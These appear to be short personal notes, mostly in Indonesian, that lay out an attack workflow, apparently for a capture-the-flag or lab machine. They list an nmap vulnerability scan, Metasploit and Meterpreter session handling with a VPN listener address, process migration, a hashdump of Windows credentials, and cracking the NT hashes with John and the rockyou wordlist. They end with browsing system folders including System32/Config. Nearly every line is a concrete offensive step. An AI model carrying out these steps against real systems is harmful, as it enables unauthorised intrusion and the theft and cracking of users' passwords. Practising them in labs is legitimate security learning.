1. scanning -> sudo nmap -sV -p 0-1000 --script vuln ip
2. jangan lupa pas pake metasploit lhosts nya ganti jadi ip vpn aja
3. set payload juga kayak instruksi
4. kalau udah ctrl + z -> taruh session 
5. baru upload meterpreter -> set session nya -> session -l -> set aja terus run
6. kalau udah coba session -l -> ganti session -> sessions -i 1 -> coba dulu udah tulisan meterpreter belum
7. command ps, terus coba migrate 700 -> terus -> hashdump
8. ambil cred yang bukan default 
9. crack pake john -> john --wordlist=rockyou --format=NT passwd -> pisahin username ama passwd y
10. jangan keluar dari meterpreter
11. explore aja : di /, di /Users/Nama, di /Windows/System32/Config
